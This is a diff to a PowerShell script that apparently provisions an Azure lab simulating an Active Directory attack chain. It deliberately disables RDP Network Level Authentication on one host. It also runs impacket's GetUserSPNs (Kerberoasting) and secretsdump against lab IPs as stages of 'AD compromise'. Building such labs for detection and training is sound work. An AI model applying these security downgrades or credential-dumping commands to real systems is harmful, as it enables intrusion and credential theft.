@@ -566,6 +566,12 @@ $domainJoinScript = @"
 `$securePassword = ConvertTo-SecureString '$domainAdminPassword' -AsPlainText -Force
 `$credential = New-Object System.Management.Automation.PSCredential('$domainAdminUser', `$securePassword)
 
+if (`$env:COMPUTERNAME -ieq 'win10') {
+# downgrade RDP security
+    Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name UserAuthentication -Value 0
+    Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name SecurityLayer -Value 0
+}
+
 # Join the server to the domain
 Add-Computer -DomainName '$domainName' -Credential `$credential -Restart -Force
 "@
@@ -885,6 +891,54 @@ $output = Invoke-AzVMRunCommand -ResourceGroupName $resourceGroupName -VMName $D
 $output.Value | ForEach-Object { $_.Message }
 
 
+
+##################################################################
+##### Web01 setup packages and simulate candice logon for win10
+# Final stage of the attack
+# LDAP Simple Bind, Kerberosting, Lateral Movement to mserv, AD compromise
+
+# Bash command to create and run the Python script
+$Command = @"
+#!/bin/bash
+export DEBIAN_FRONTEND=noninteractive
+sudo apt-get update -y
+sudo apt-get install -y python3-pip python3-venv freerdp2-x11 xvfb
+python3 -m pip install --user pipx
+python3 -m pipx ensurepath
+export PATH="`$PATH`:`$HOME/.local/bin"
+python3 -m pipx install impacket
+pip3 install ldap3
+echo "$PythonScript" > /tmp/temp_script.py
+Xvfb :99 -screen 0 1024x768x16 &
+export DISPLAY=:99
+timeout 90 xfreerdp /v:10.0.0.6 /u:adm0 /p:$adminPassword /dynamic-resolution /cert:ignore
+unset DEBIAN_FRONTEND 
+"@
+
+
+# Execute the command on the Linux VM
+Write-Output "Executing script on the Linux VM web01..."
+try {
+    $result = Invoke-AzVMRunCommand -ResourceGroupName $resourceGroupName `
+                                    -VMName $web01Name `
+                                    -CommandId "RunShellScript" `
+                                    -ScriptString $Command
+
+    if ($result) {
+        Write-Output "Command executed successfully. Output:"
+        $result.Value[0].Message | Write-Output
+    } else {
+        Write-Output "Command execution failed or returned no output."
+    }
+} catch {
+    Write-Error "Failed to execute command: $_"
+}
+
+
+
+
+
+##################################################################
 
 #Downgrade to NTLM and access DC file share under an account with NTLM
 $mservscript = @"
@@ -1497,19 +1551,9 @@ connect_to_ad(AD_SERVER, AD_USER2, AD_PASSWORD)
 # Bash command to create and run the Python script
 $Command = @"
 #!/bin/bash
-export DEBIAN_FRONTEND=noninteractive
-sudo apt-get update -y
-sudo apt-get install -y python3-pip python3-venv
-python3 -m pip install --user pipx
-python3 -m pipx ensurepath
-export PATH="`$PATH`:`$HOME/.local/bin"
-python3 -m pipx install impacket
-pip3 install ldap3
-echo "$PythonScript" > /tmp/temp_script.py
 python3 /tmp/temp_script.py
 sudo /root/.local/bin/GetUserSPNs.py -dc-ip 10.0.0.4 odomain.local/candice.kevin:'$adminPassword' -request
 sudo /root/.local/bin/secretsdump.py 'ODOMAIN/ssupport:$adminPassword'@10.0.0.5
-unset DEBIAN_FRONTEND 
 "@
 
 
